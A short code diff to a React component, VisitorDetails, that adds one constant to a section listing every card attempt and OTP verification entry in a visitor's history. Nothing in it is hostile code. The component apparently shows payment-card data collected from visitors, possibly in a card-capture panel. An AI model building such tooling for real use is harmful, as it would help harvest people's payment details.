@@ -231,6 +231,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
 
   // 4. Payment & Verification Data
   // Show ALL card attempts from history (newest first)
+  const hasMultipleAttempts = false // For phone OTP compatibility
   
   // Get all card entries from history
   const allCardHistory = visitor.history?.filter((h: any) => h.type === '_t1' || h.type === 'card') || []
